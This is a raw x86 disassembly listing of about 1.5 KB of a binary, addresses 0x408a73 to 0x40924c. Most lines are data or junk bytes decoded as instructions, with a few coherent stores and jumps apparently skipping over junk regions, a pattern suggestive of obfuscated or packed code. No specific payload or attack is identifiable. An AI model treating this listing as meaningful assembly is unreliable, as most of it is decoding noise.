  408a73:	call   0xd0a9:0x1eaf4a5a
  408a7a:	scas   eax,DWORD PTR es:[edi]
  408a7b:	rcl    DWORD PTR [ecx+0x45],cl
  408a7e:	mov    edi,0xd6cb4a5b
  408a83:	lahf   
  408a84:	stos   BYTE PTR es:[edi],al
  408a85:	sub    cl,BYTE PTR [ebx*4+0x7fcd80a2]
  408a8c:	in     al,dx
  408a8d:	fiadd  WORD PTR [esi]
  408a8f:	in     al,0xd0
  408a91:	pop    ebx
  408a92:	(bad)  
  408a94:	fcomp  st(2)
  408a96:	xor    BYTE PTR [ebx-0x1666af4c],bh
  408a9c:	or     ebp,DWORD PTR [ecx+0x717c70d8]
  408aa2:	sbb    DWORD PTR [eax-0x1d84be9],ebp
  408aa8:	mov    dl,0xb0
  408aaa:	or     bh,BYTE PTR [esi+0x14876191]
  408ab0:	call   0xeb831183
  408ab5:	in     al,dx
  408ab6:	or     al,BYTE PTR [edx]
  408ab8:	adc    eax,0x988c0586
  408abd:	and    al,0x8b
  408abf:	ret    
  408ac0:	mov    bl,0x68
  408ac2:	add    bl,bl
  408ac4:	aad    0x36
  408ac6:	imul   esp,DWORD PTR [ebp+0x28797ff9],0x5
  408acd:	and    cl,dh
  408acf:	lds    esi,FWORD PTR [esi]
  408ad1:	add    eax,0x49b89054
  408ad6:	jne    0x408ab9
  408ad8:	in     eax,dx
  408ad9:	mov    ch,BYTE PTR [eax-0x7c]
  408adc:	inc    esp
  408add:	leave  
  408ade:	cmp    al,0xc1
  408ae0:	push   0xffffff9c
  408ae2:	addr16 inc eax
  408ae4:	adc    BYTE PTR [eax-0x27],ah
  408ae7:	fimul  DWORD PTR [eax]
  408ae9:	and    BYTE PTR [edx],dh
  408aeb:	outs   dx,BYTE PTR ds:[esi]
  408aec:	out    dx,al
  408aed:	mov    al,0x0
  408aef:	or     al,ah
  408af1:	mov    ebx,0xf42aea34
  408af6:	loope  0x408a81
  408af8:	stos   DWORD PTR es:[edi],eax
  408af9:	jno    0x408b52
  408afb:	scas   eax,DWORD PTR es:[edi]
  408afc:	mov    esp,0x71fe1f75
  408b01:	scas   al,BYTE PTR es:[edi]
  408b02:	jmp    0x38aa2adc
  408b07:	ror    DWORD PTR [eax],1
  408b09:	or     eax,0x4d56791a
  408b0e:	jmp    0x408ae0
  408b10:	xor    dl,BYTE PTR [eax+0x25]
  408b13:	jecxz  0x408b11
  408b15:	(bad)  
  408b16:	sbb    BYTE PTR [eax+0x58],bl
  408b19:	daa    
  408b1a:	lahf   
  408b1b:	mov    dh,0x5c
  408b1d:	pop    ds
  408b1e:	push   edi
  408b1f:	or     dh,dl
  408b21:	push   ss
  408b22:	jle    0x408ad9
  408b24:	sbb    eax,0x16de0485
  408b29:	dec    esp
  408b2a:	icebp  
  408b2b:	sbb    al,0x62
  408b2d:	mov    DWORD PTR [ebp+0x8],0xebeb4fd3
  408b34:	mov    eax,0xffffdedc
  408b39:	jmp    0x408c11
  408b3e:	jecxz  0x408b44
  408b40:	outs   dx,BYTE PTR ds:[esi]
  408b41:	loope  0x408b32
  408b43:	jmp    0x408b34
  408b45:	push   es
  408b46:	adc    al,0x68
  408b48:	xor    eax,0x79f69838
  408b4d:	xor    ecx,DWORD PTR [ebx-0x44ffffae]
  408b53:	add    BYTE PTR [eax],al
  408b55:	add    BYTE PTR [ebp+0x9],dl
  408b58:	(bad)  
  408b5a:	xchg   ebp,eax
  408b5b:	dec    ecx
  408b5c:	call   0x32e2ceaa
  408b61:	or     ah,BYTE PTR [ebx+0x61]
  408b64:	mov    eax,0x1f14e5e8
  408b69:	test   eax,0x523d5641
  408b6e:	js     0x408b68
  408b70:	imul   ecx,edi,0x60ab181d
  408b76:	dec    edx
  408b77:	pop    es
  408b78:	mov    esp,0x93ac8fe6
  408b7d:	scas   eax,DWORD PTR es:[edi]
  408b7e:	mov    dl,dh
  408b80:	mov    ?,WORD PTR [eax]
  408b82:	shr    DWORD PTR ds:0x5d4103c7,0xe2
  408b89:	pop    ecx
  408b8a:	std    
  408b8b:	cs push ds
  408b8d:	dec    esi
  408b8e:	cmp    eax,0x81f1d365
  408b93:	jbe    0x408bd6
  408b95:	(bad)  
  408b96:	push   esi
  408b97:	mov    WORD PTR [edx+0x6e],es
  408b9a:	nop
  408b9b:	imul   esp,DWORD PTR [ebx-0x72],0x358e438f
  408ba2:	in     al,0x8b
  408ba4:	jecxz  0x408bc4
  408ba6:	pop    eax
  408ba7:	and    eax,0x51abb901
  408bac:	addr16 aam 0x1b
  408baf:	sub    ecx,DWORD PTR [edx]
  408bb1:	jo     0x408b5e
  408bb3:	fs (bad) 
  408bb5:	mov    ebp,0xe9637c9a
  408bba:	pushf  
  408bbb:	pusha  
  408bbc:	mov    bl,BYTE PTR [ecx]
  408bbe:	mov    dh,0xa6
  408bc0:	ins    BYTE PTR es:[edi],dx
  408bc1:	iret   
  408bc2:	(bad)  
  408bc3:	dec    esi
  408bc4:	xchg   esp,esp
  408bc6:	sub    ebp,esi
  408bc8:	or     DWORD PTR [ecx+ebp*4-0x3d],eax
  408bcc:	mov    bh,0xb4
  408bce:	push   eax
  408bcf:	fst    st(2)
  408bd1:	and    BYTE PTR [ebx],dh
  408bd3:	jns    0x408c4b
  408bd5:	jge    0x408bc7
  408bd7:	sbb    esp,edi
  408bd9:	test   al,0x25
  408bdb:	sub    esp,DWORD PTR [ecx]
  408bdd:	jge    0x408bd5
  408bdf:	mov    dh,0x66
  408be1:	xchg   edx,eax
  408be2:	in     eax,dx
  408be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408be4:	push   ds
  408be5:	mov    ch,0x96
  408be7:	ins    DWORD PTR es:[edi],dx
  408be8:	jno    0x408bd3
  408bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408beb:	mov    ecx,0xdb7564d5
  408bf0:	mov    bl,0x71
  408bf2:	dec    ecx
  408bf3:	aas    
  408bf4:	mov    bh,0xc8
  408bf6:	push   es
  408bf7:	and    eax,0xf72776cd
  408bfc:	jl     0x408b8e
  408bfe:	xchg   ebx,eax
  408bff:	adc    eax,0x4e8bb5e7
  408c04:	lds    esp,FWORD PTR [esi]
  408c06:	lea    edx,ds:0x2b9f86dd
  408c0c:	mov    ebp,0x24ab2082
  408c11:	mov    DWORD PTR [ebp+0xc],eax
  408c14:	mov    DWORD PTR [ebp+0x18],0xebeb4fd4
  408c1b:	jmp    0x408cf3
  408c20:	or     BYTE PTR [edx+0x67],bh
  408c23:	ins    DWORD PTR es:[edi],dx
  408c24:	ja     0x408ca3
  408c26:	or     bh,BYTE PTR [edi-0x66]
  408c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c2a:	sti    
  408c2b:	xor    ecx,DWORD PTR [edx]
  408c2d:	lds    ecx,FWORD PTR [esi]
  408c2f:	mov    eax,ds:0x5346
  408c34:	mov    ebx,0xb2000000
  408c39:	or     edx,ebp
  408c3b:	mov    dh,0x41
  408c3d:	mov    edx,0xa7a31070
  408c42:	pop    ds
  408c43:	cmp    DWORD PTR [ecx+0x17caa843],esp
  408c49:	mov    ds:0xd18151b0,eax
  408c4e:	mov    edx,0xed787b0e
  408c53:	push   cs
  408c54:	test   al,0x70
  408c56:	push   0xffffffc1
  408c58:	mov    bh,0xc5
  408c5a:	inc    ebx
  408c5b:	stc    
  408c5c:	jle    0x408bf2
  408c5e:	jle    0x408c73
  408c60:	dec    ecx
  408c61:	cmp    BYTE PTR [ebx],al
  408c63:	shl    BYTE PTR [eax-0x1e53eeba],cl
  408c69:	popa   
  408c6a:	xchg   esi,eax
  408c6b:	ds cwde 
  408c6d:	push   ebp
  408c6e:	loopne 0x408c2a
  408c70:	mov    esp,0xb039154
  408c76:	mov    edi,0xaa9c17e4
  408c7b:	es mov bl,0x74
  408c7e:	aas    
  408c7f:	adc    edi,esp
  408c81:	clc    
  408c82:	push   0x2b
  408c84:	test   DWORD PTR [edx],ebx
  408c86:	aam    0x58
  408c88:	fs dec ebx
  408c8a:	mov    bh,bh
  408c8c:	popf   
  408c8d:	(bad)  
  408c8e:	fnsave [edi+0x1d]
  408c91:	pop    ds
  408c92:	jl     0x408cd2
  408c94:	cs mov al,0x43
  408c97:	sub    al,0x45
  408c99:	push   ebp
  408c9a:	adc    esp,eax
  408c9c:	jbe    0x408cbb
  408c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c9f:	cld    
  408ca0:	adc    eax,0xfad83f49
  408ca6:	sti    
  408ca7:	loop   0x408d19
  408ca9:	loope  0x408d1f
  408cab:	ja     0x408cd4
  408cad:	stc    
  408cae:	mov    ecx,0x2b020e01
  408cb3:	ja     0x408c9a
  408cb5:	cs scas eax,DWORD PTR es:[edi]
  408cb7:	push   eax
  408cb8:	fadd   st,st(0)
  408cba:	inc    ebp
  408cbb:	cdq    
  408cbc:	lds    ebx,FWORD PTR ds:0x97d4aea1
  408cc2:	scas   al,BYTE PTR es:[edi]
  408cc3:	popf   
  408cc4:	fisttp DWORD PTR [ecx]
  408cc6:	jno    0x408c7a
  408cc8:	add    eax,0x3def2373
  408ccd:	inc    esp
  408cce:	jge    0x408cb9
  408cd0:	and    al,0x41
  408cd2:	dec    esp
  408cd3:	rcpps  xmm3,XMMWORD PTR [edi-0xc]
  408cd7:	(bad)  
  408cd8:	into   
  408cd9:	ss mov bl,0x82
  408cdc:	data16 jnp 0x408d2a
  408cdf:	mov    ?,WORD PTR [ecx-0x43]
  408ce2:	add    BYTE PTR [edi+0x36],bh
  408ce5:	xor    al,bh
  408ce7:	xor    edx,DWORD PTR [ebx+0x5a8be805]
  408ced:	int3   
  408cee:	sahf   
  408cef:	lods   al,BYTE PTR ds:[esi]
  408cf0:	loop   0x408d4f
  408cf2:	and    al,0x89
  408cf4:	inc    ebp
  408cf5:	sbb    al,0xe9
  408cf7:	rol    DWORD PTR [eax],cl
  408cf9:	add    BYTE PTR [eax],al
  408cfb:	outs   dx,DWORD PTR ds:[esi]
  408cfc:	call   ebp
  408cfe:	xor    al,0xd5
  408d00:	ds out dx,eax
  408d02:	call   FWORD PTR [edx+0x6cc30dbf]
  408d08:	jnp    0x408d0a
  408d0a:	in     al,0x1
  408d0c:	push   esp
  408d0d:	add    BYTE PTR [eax],al
  408d0f:	mov    ebx,0x72000000
  408d14:	call   0xfa1e2e4d
  408d19:	sbb    ebx,DWORD PTR [eax+0x1c241ff2]
  408d1f:	in     eax,0xc7
  408d21:	shl    BYTE PTR [esi+0x147e9f54],cl
  408d27:	fst    st(4)
  408d29:	and    BYTE PTR [edi],0xc5
  408d2c:	or     esp,DWORD PTR [esi+0x6e2e666]
  408d32:	xor    BYTE PTR [ebx],ah
  408d34:	clc    
  408d35:	push   esp
  408d36:	repz xchg edx,eax
  408d38:	mov    BYTE PTR [edx+edx*8],dh
  408d3b:	(bad)  
  408d3c:	dec    esp
  408d3d:	pushf  
  408d3e:	jno    0x408da7
  408d40:	push   ss
  408d41:	shl    WORD PTR [ebp-0x6a],1
  408d45:	pushf  
  408d46:	push   es
  408d47:	in     al,0xbe
  408d49:	daa    
  408d4a:	inc    eax
  408d4b:	add    DWORD PTR [esi+0x486f7be5],edi
  408d51:	sbb    DWORD PTR [ecx],ebx
  408d53:	into   
  408d54:	inc    esi
  408d55:	xlat   BYTE PTR ds:[ebx]
  408d56:	xor    ebx,DWORD PTR [edx+0x69b24ca1]
  408d5c:	int    0xc3
  408d5e:	ja     0x408d00
  408d60:	pop    ebx
  408d61:	sub    eax,0xf60e4d09
  408d66:	(bad)  
  408d67:	aam    0x72
  408d69:	ror    DWORD PTR [edx-0x787cf564],cl
  408d6f:	aam    0x90
  408d71:	cmp    ah,BYTE PTR [ebx+esi*2]
  408d74:	push   edi
  408d75:	mov    dh,0x24
  408d77:	dec    edx
  408d78:	pop    eax
  408d79:	popf   
  408d7a:	and    ebx,ebp
  408d7c:	sbb    DWORD PTR [edi],ebp
  408d7e:	and    dl,BYTE PTR [ecx-0x67]
  408d81:	xor    DWORD PTR [edi+0x17],esp
  408d84:	out    0x15,al
  408d86:	rcl    DWORD PTR cs:[esp+esi*4+0xd],1
  408d8b:	adc    ah,BYTE PTR [eax-0x36248a75]
  408d91:	xchg   ebp,eax
  408d92:	dec    esi
  408d93:	ins    DWORD PTR es:[edi],dx
  408d94:	jg     0x408dd2
  408d96:	ss mov esp,0x74fb2329
  408d9c:	popf   
  408d9d:	popa   
  408d9e:	add    ch,dl
  408da0:	inc    eax
  408da1:	and    eax,0x92662d58
  408da6:	test   DWORD PTR [esi+0x33],ebx
  408da9:	std    
  408daa:	cld    
  408dab:	pop    ecx
  408dac:	push   ebp
  408dad:	xlat   BYTE PTR ds:[ebx]
  408dae:	dec    edx
  408daf:	(bad)  
  408db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408db1:	add    eax,0x128fd8bf
  408db6:	mov    dh,0x14
  408db8:	(bad)  
  408db9:	push   ss
  408dba:	fisub  WORD PTR [ecx+0x1fb7fe6b]
  408dc0:	pop    ss
  408dc1:	mov    edx,0xb3136cdd
  408dc6:	sar    dh,cl
  408dc8:	add    ecx,DWORD PTR [edx+0x55c8fea4]
  408dce:	mov    DWORD PTR [ebp-0x38],0xebeb4fd5
  408dd5:	mov    DWORD PTR [ebp-0x34],eax
  408dd8:	mov    DWORD PTR [ebp-0x28],0xebeb4fd6
  408ddf:	mov    DWORD PTR [ebp-0x24],eax
  408de2:	mov    eax,DWORD PTR [ebp+0x8]
  408de5:	jmp    0x408ebd
  408dea:	inc    edx
  408dec:	(bad)  
  408dee:	std    
  408def:	(bad)  
  408df0:	inc    edx
  408df2:	fwait
  408df3:	add    edx,DWORD PTR [edx-0x5f]
  408df6:	test   DWORD PTR [eax+0x54bcdeb4],esi
  408dfc:	add    BYTE PTR [eax],al
  408dfe:	mov    ebx,0xf8000000
  408e03:	pop    esp
  408e04:	call   0x34c9:0x78a32c63
  408e0b:	mov    al,0x59
  408e0d:	test   DWORD PTR ds:[edx-0x23e34d24],esi
  408e14:	frstor [edi+0x17]
  408e17:	push   edx
  408e18:	adc    al,0x19
  408e1a:	push   0xffffffb5
  408e1c:	jmp    0x408e57
  408e1e:	(bad)  
  408e1f:	mov    cl,0x20
  408e21:	mov    gs,WORD PTR [esi+0x549f6b28]
  408e27:	push   edi
  408e28:	loop   0x408e4a
  408e2a:	ret    
  408e2b:	push   ss
  408e2c:	xchg   ah,bh
  408e2e:	out    dx,al
  408e2f:	sbb    ecx,DWORD PTR [ebp+0x66ee4d86]
  408e35:	push   0xd01c4ac4
  408e3a:	inc    esp
  408e3b:	pop    ebp
  408e3c:	and    DWORD PTR [ebx],edi
  408e3e:	retf   
  408e3f:	jle    0x408e5c
  408e41:	mov    dh,0x95
  408e43:	loope  0x408df8
  408e45:	jmp    0x1e68:0xa949e3b
  408e4c:	je     0x408dde
  408e4e:	adc    BYTE PTR ss:[edi+0x39eb65],al
  408e55:	sub    eax,0x6026d050
  408e5a:	mov    WORD PTR [edi+eiz*8],?
  408e5d:	mov    edi,0x94443140
  408e62:	scas   al,BYTE PTR es:[edi]
  408e63:	xor    bl,dl
  408e65:	xchg   BYTE PTR [ebx],bh
  408e67:	sub    BYTE PTR [esi+0x2d],ch
  408e6a:	pop    ss
  408e6b:	in     al,0xb7
  408e6d:	retf   0xdd2d
  408e70:	mov    ah,0x53
  408e72:	xchg   edx,eax
  408e73:	les    eax,FWORD PTR [eax+0x7]
  408e76:	dec    ecx
  408e77:	jb     0x408ede
  408e79:	out    dx,al
  408e7a:	int3   
  408e7b:	iret   
  408e7c:	sbb    edx,esi
  408e7e:	jns    0x408eb3
  408e80:	mov    dh,0x99
  408e82:	ds xchg edi,eax
  408e84:	pop    ebp
  408e85:	loopne 0x408ed5
  408e87:	inc    eax
  408e88:	gs cld 
  408e8a:	jne    0x408e58
  408e8c:	cld    
  408e8d:	rol    DWORD PTR [esi+0x3a],0xc7
  408e91:	mov    bl,0x67
  408e93:	repnz inc ecx
  408e95:	aas    
  408e96:	and    bl,BYTE PTR [eax+0x4ec332a4]
  408e9c:	jecxz  0x408e6b
  408e9e:	pop    ebp
  408e9f:	add    al,cl
  408ea1:	and    al,0x18
  408ea3:	clc    
  408ea4:	repz cmp bh,BYTE PTR es:[ecx]
  408ea8:	popf   
  408ea9:	add    DWORD PTR [ebx],edi
  408eab:	push   es
  408eac:	jns    0x408e49
  408eae:	sub    dh,BYTE PTR [esi-0x6ccafd42]
  408eb4:	xchg   bh,ch
  408eb6:	lahf   
  408eb7:	sar    DWORD PTR [eax-0x67],1
  408eba:	xor    BYTE PTR [ebp+ebp*1-0x75],bh
  408ebe:	push   ebp
  408ebf:	or     al,0x8b
  408ec1:	adc    eax,0x42f1d4
  408ec6:	xor    eax,esi
  408ec8:	jmp    0x408fa0
  408ecd:	mov    edi,0x7fae7bc9
  408ed2:	mov    esi,0xdff3d9ff
  408ed7:	mov    dl,0x33
  408ed9:	xchg   DWORD PTR [edx+0x5577e429],eax
  408edf:	add    BYTE PTR [eax],al
  408ee1:	mov    ebx,0x2d000000
  408ee6:	sbb    bl,BYTE PTR [edi]
  408ee8:	pop    eax
  408ee9:	in     al,0x38
  408eeb:	push   0xe0653f74
  408ef0:	xor    ecx,DWORD PTR [esi-0xf011854]
  408ef6:	mov    eax,ds:0x426d2262
  408efb:	mov    WORD PTR [ebp-0x75134b81],ss
  408f01:	xor    al,0xf8
  408f03:	repz cmp DWORD PTR [ebx+0x26],edx
  408f07:	out    0x5b,al
  408f09:	test   al,0x6a
  408f0b:	sub    BYTE PTR [esi+0x5b],bl
  408f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0f:	cmp    ch,bl
  408f11:	mov    ecx,0xef4fecfd
  408f16:	enter  0xd7,0x46
  408f1a:	shr    DWORD PTR [edx],cl
  408f1c:	or     eax,0xd2de0b12
  408f21:	fldenv [esi+0x7781dcd2]
  408f27:	dec    esi
  408f28:	int3   
  408f29:	mov    WORD PTR [edx+0x33],cs
  408f2c:	and    eax,DWORD PTR [ebp+0x4b]
  408f2f:	push   0xfffffff2
  408f31:	test   al,0xe0
  408f33:	or     BYTE PTR [edi-0x4eb6fb2],ah
  408f39:	add    eax,0xcead1b3
  408f3e:	stc    
  408f3f:	jb     0x408f87
  408f41:	push   eax
  408f42:	add    eax,0xf317bf2c
  408f47:	pushf  
  408f48:	test   eax,0x36c46e98
  408f4d:	push   esi
  408f4e:	add    dl,dh
  408f50:	inc    esp
  408f51:	pop    edx
  408f52:	add    al,0xb3
  408f54:	aad    0x64
  408f56:	cmp    eax,0xda7fc728
  408f5b:	adc    al,0x1d
  408f5d:	xchg   esi,eax
  408f5e:	ret    
  408f5f:	dec    ecx
  408f60:	pop    esp
  408f61:	cld    
  408f62:	mov    ah,0xb0
  408f64:	aam    0x48
  408f66:	add    BYTE PTR [ecx],0xd5
  408f69:	push   ebx
  408f6a:	jno    0x408f1c
  408f6c:	into   
  408f6d:	pushf  
  408f6e:	cmc    
  408f6f:	and    ebx,DWORD PTR [ecx]
  408f71:	sahf   
  408f72:	mov    edi,0xf81efdc4
  408f77:	mov    ss,WORD PTR [edi+0x53]
  408f7a:	mov    bh,0x39
  408f7c:	call   0x1490:0x3c746b88
  408f83:	jae    0x408fd8
  408f85:	cdq    
  408f86:	inc    esi
  408f87:	in     al,dx
  408f88:	int3   
  408f89:	fidivr WORD PTR [ecx+0x41c3fd0]
  408f8f:	cmp    ch,bh
  408f91:	push   ss
  408f92:	xchg   ebp,edi
  408f94:	lock cmp BYTE PTR [eax],cl
  408f97:	ror    ebx,1
  408f99:	les    esi,FWORD PTR [edx-0x721f18e6]
  408f9f:	les    ecx,FWORD PTR [ebp+0x624d1084]
  408fa5:	mov    eax,0x10458999
  408faa:	mov    eax,DWORD PTR [ebp+0x8]
  408fad:	mov    edx,DWORD PTR [ebp+0xc]
  408fb0:	xor    eax,esi
  408fb2:	jmp    0x40908a
  408fb7:	jbe    0x409010
  408fb9:	enter  0xe903,0x9f
  408fbd:	push   DWORD PTR [edi-0x28]
  408fc0:	push   es
  408fc1:	inc    eax
  408fc2:	cmp    BYTE PTR [esi+0x320dbc9a],dl
  408fc8:	push   esi
  408fc9:	add    BYTE PTR [eax],al
  408fcb:	mov    ebx,0x12000000
  408fd0:	inc    ebx
  408fd1:	and    DWORD PTR [esi],edx
  408fd3:	adc    eax,0x3dcb7bc8
  408fd8:	mov    edi,DWORD PTR [edi-0x7c8632be]
  408fde:	adc    al,0xb7
  408fe0:	jecxz  0x409009
  408fe2:	add    BYTE PTR [ebx+eiz*4],0x95
  408fe6:	add    al,BYTE PTR [ebx-0x646f22d5]
  408fec:	push   es
  408fed:	mov    DWORD PTR [ecx],ecx
  408fef:	ficom  DWORD PTR [edi]
  408ff1:	aam    0xc8
  408ff3:	(bad)  [esi]
  408ff5:	out    dx,al
  408ff6:	jbe    0x408fba
  408ff8:	clc    
  408ff9:	dec    eax
  408ffa:	aaa    
  408ffb:	add    ebx,DWORD PTR [edi]
  408ffd:	out    0xdc,eax
  408fff:	add    eax,0x16963708
  409004:	xchg   esi,eax
  409005:	stc    
  409006:	sub    al,0x46
  409008:	imul   eax,esp,0x2e2fd05b
  40900e:	push   ecx
  40900f:	out    0xe8,eax
  409011:	out    dx,al
  409012:	sbb    DWORD PTR [eax],0x1e
  409015:	mov    bh,BYTE PTR [edx]
  409017:	jecxz  0x40906e
  409019:	in     al,dx
  40901a:	std    
  40901b:	inc    ebx
  40901c:	cmp    BYTE PTR [ebp+0x75da7d5e],al
  409022:	enter  0x2a85,0xcf
  409026:	fiadd  DWORD PTR [eax+0x7a]
  409029:	loope  0x409005
  40902b:	sbb    ecx,DWORD PTR [ebx+0x22]
  40902e:	aam    0x2f
  409030:	push   es
  409031:	out    0x70,eax
  409033:	mov    eax,ds:0xb4f85743
  409038:	dec    ecx
  409039:	xchg   esi,eax
  40903a:	mov    edx,0xae19f2f3
  40903f:	in     eax,0xfe
  409041:	xor    eax,0x66daf568
  409046:	and    DWORD PTR [esi+esi*2],0x569df36
  40904d:	pop    ss
  40904e:	xor    DWORD PTR [edx],eax
  409050:	jl     0x408fe3
  409052:	arpl   ax,bp
  409054:	ja     0x408fd9
  409056:	(bad)  
  409058:	imul   ebx,DWORD PTR [eax+esi*1-0x72],0xffffff96
  40905d:	push   ebx
  40905e:	fild   QWORD PTR [ecx+0x1fc53328]
  409064:	jg     0x4090aa
  409066:	not    eax
  409068:	inc    ecx
  409069:	call   0x85bc:0xceccb011
  409070:	jbe    0x409039
  409072:	inc    esp
  409073:	cld    
  409074:	jns    0x409094
  409076:	jbe    0x4090c4
  409078:	push   ss
  409079:	nop
  40907a:	fisubr DWORD PTR [eax+0x4700d544]
  409080:	clc    
  409081:	daa    
  409082:	jp     0x4090fc
  409084:	add    eax,0x4259e57c
  409089:	jge    0x409015
  40908b:	xchg   esp,eax
  40908c:	add    eax,0x99b86249
  409091:	jmp    0x409169
  409096:	mov    eax,ds:0xfaf0f02b
  40909b:	sti    
  40909c:	mov    eax,ds:0x94f2aa7b
  4090a1:	lahf   
  4090a2:	mov    eax,0xed38c072
  4090a7:	push   esi
  4090a8:	add    BYTE PTR [eax],al
  4090aa:	mov    ebx,0xb2000000
  4090af:	enter  0xcb51,0xb6
  4090b3:	xchg   esp,eax
  4090b4:	push   edi
  4090b5:	push   0xb68ac4c9
  4090ba:	hlt    
  4090bb:	add    al,0x3a
  4090bd:	mov    ebp,0xeabc3d6b
  4090c2:	popf   
  4090c3:	in     eax,0xe9
  4090c5:	daa    
  4090c6:	enter  0xe16e,0x32
  4090ca:	or     BYTE PTR [edx+0x27437acc],bh
  4090d0:	push   ebp
  4090d1:	aaa    
  4090d2:	or     BYTE PTR [ecx],bh
  4090d4:	ins    DWORD PTR es:[edi],dx
  4090d5:	lods   al,BYTE PTR ds:[esi]
  4090d6:	sub    edi,ebx
  4090d8:	or     al,0xf0
  4090da:	jno    0x4090eb
  4090dc:	lea    edx,[ebx+eax*4+0x26671ce5]
  4090e3:	inc    esp
  4090e4:	ror    BYTE PTR [eax],0xb
  4090e7:	inc    ecx
  4090e8:	scas   al,BYTE PTR es:[edi]
  4090e9:	out    dx,eax
  4090ea:	xchg   edi,eax
  4090eb:	scas   al,BYTE PTR es:[edi]
  4090ec:	cmp    al,bl
  4090ee:	imul   eax,DWORD PTR [esi],0x4acb86ca
  4090f4:	not    BYTE PTR [edx+0x7f]
  4090f7:	outs   dx,BYTE PTR ds:[esi]
  4090f8:	lahf   
  4090f9:	test   dh,0x48
  4090fc:	sbb    eax,0x2b8b2272
  409101:	in     eax,dx
  409102:	out    dx,eax
  409103:	jo     0x40917c
  409105:	outs   dx,DWORD PTR ds:[esi]
  409106:	or     ah,BYTE PTR [ecx]
  409108:	das    
  409109:	cmp    BYTE PTR [ebp+0x6f378874],ah
  40910f:	out    dx,eax
  409110:	rol    DWORD PTR [esp+ecx*2],cl
  409113:	daa    
  409114:	jge    0x40912a
  409116:	out    dx,eax
  409117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409118:	fisub  DWORD PTR [edx-0x3a565904]
  40911e:	cmp    eax,0xc38d379b
  409123:	shr    BYTE PTR [edi+0x8913d5c],cl
  409129:	jmp    0x3590283d
  40912e:	push   ebp
  40912f:	cmp    bh,dh
  409131:	aaa    
  409132:	test   BYTE PTR [edx-0x5b],0xe3
  409136:	pop    edx
  409137:	and    edi,edi
  409139:	stos   BYTE PTR es:[edi],al
  40913a:	(bad)  
  40913b:	sub    eax,0x17447fc9
  409140:	scas   eax,DWORD PTR es:[edi]
  409141:	fimul  DWORD PTR [edi]
  409143:	mov    dh,BYTE PTR [edi]
  409145:	sbb    cl,BYTE PTR [eax+0x53505c08]
  40914b:	mov    DWORD PTR [edx-0x23],esp
  40914e:	pop    ss
  40914f:	js     0x409100
  409151:	mov    BYTE PTR [edi],dh
  409153:	jg     0x4091a8
  409155:	cld    
  409156:	pusha  
  409157:	popa   
  409158:	push   ss
  409159:	bound  esi,QWORD PTR ds:[edi+eax*8-0x29ca3ac3]
  409161:	ja     0x4090ec
  409163:	stc    
  409164:	xor    BYTE PTR [edx-0x74953d2e],al
  40916a:	inc    ebp
  40916b:	adc    BYTE PTR [eax],dh
  40916d:	adc    cl,ch
  40916f:	rol    DWORD PTR [eax],cl
  409171:	add    BYTE PTR [eax],al
  409173:	push   eax
  409174:	or     eax,DWORD PTR [ecx+0x17]
  409177:	pop    ebx
  409178:	pop    edi
  409179:	push   esi
  40917a:	dec    edi
  40917b:	sub    BYTE PTR [edx+0x55],dl
  40917e:	lock scas eax,DWORD PTR es:[di]
  409181:	rcr    DWORD PTR [edi-0x58],cl
  409184:	push   edi
  409185:	add    BYTE PTR [eax],al
  409187:	mov    ebx,0x6000000
  40918c:	stos   BYTE PTR es:[edi],al
  40918d:	ret    
  40918e:	xor    DWORD PTR [ebp+0xa],ebp
  409191:	inc    ebx
  409192:	std    
  409193:	sub    ah,cl
  409195:	xor    ebx,esi
  409197:	add    eax,0x4e503db2
  40919c:	js     0x409172
  40919e:	mov    ds:0x9af69890,al
  4091a3:	xor    ebp,DWORD PTR [ebp+0x72]
  4091a6:	ins    BYTE PTR es:[edi],dx
  4091a7:	test   DWORD PTR [eax-0x48],ebp
  4091aa:	bound  edi,QWORD PTR [esi+0x51]
  4091ad:	cwde   
  4091ae:	pop    esp
  4091af:	std    
  4091b0:	adc    DWORD PTR [ebp-0x6],0xfffffff3
  4091b4:	and    BYTE PTR ds:0xddb91dfb,ah
  4091ba:	and    al,0x6b
  4091bc:	or     ch,ch
  4091be:	into   
  4091bf:	mov    esp,0xeaa4409c
  4091c4:	or     BYTE PTR [edi+0x5fe7a927],ch
  4091ca:	mov    ebx,0x1d81c987
  4091cf:	cmp    ecx,DWORD PTR [edx]
  4091d1:	mov    ds:0xf8960773,eax
  4091d6:	retf   
  4091d7:	mov    al,ds:0x125d9a31
  4091dc:	jmp    0x5444:0x49ef5a9b
  4091e3:	sub    ah,bl
  4091e5:	fiadd  WORD PTR [ecx+eiz*4+0x37]
  4091e9:	and    eax,0x87c7d11a
  4091ee:	inc    edi
  4091ef:	dec    eax
  4091f0:	scas   eax,DWORD PTR es:[edi]
  4091f1:	dec    ebx
  4091f2:	sbb    al,0xb
  4091f4:	sub    cl,BYTE PTR [esp+ebp*1+0x6ac50292]
  4091fb:	nop
  4091fc:	enter  0x6301,0x76
  409200:	mov    WORD PTR [esi-0x42],fs
  409203:	das    
  409204:	ins    DWORD PTR es:[edi],dx
  409205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409206:	pop    es
  409207:	aad    0xef
  409209:	aam    0x35
  40920b:	lods   eax,DWORD PTR ds:[esi]
  40920c:	push   ebx
  40920d:	mov    ecx,0x862682a1
  409212:	lods   eax,DWORD PTR ds:[esi]
  409213:	call   0x8e03a96f
  409218:	add    bh,BYTE PTR [eax-0x7f]
  40921b:	push   cs
  40921c:	mov    eax,ds:0xa4a4cec2
  409221:	repnz (bad) 
  409223:	test   DWORD PTR [ebx+ebp*2+0x36287d5a],0x1edc4b31
  40922e:	(bad)  [esi+ecx*4+0x4b]
  409232:	mov    ah,0x3
  409234:	sbb    esi,DWORD PTR [ebx+0x2cb6239]
  40923a:	push   eax
  40923b:	loop   0x4091ee
  40923d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40923e:	push   ds
  40923f:	ret    
  409240:	aas    
  409241:	cli    
  409242:	sub    al,0x3c
  409244:	sbb    esi,edi
  409246:	mov    eax,DWORD PTR [ebp+0x18]
  409249:	mov    edx,DWORD PTR [ebp+0x1c]
  40924c:	mov    edx,DWORD PTR ds:0x42f1d4
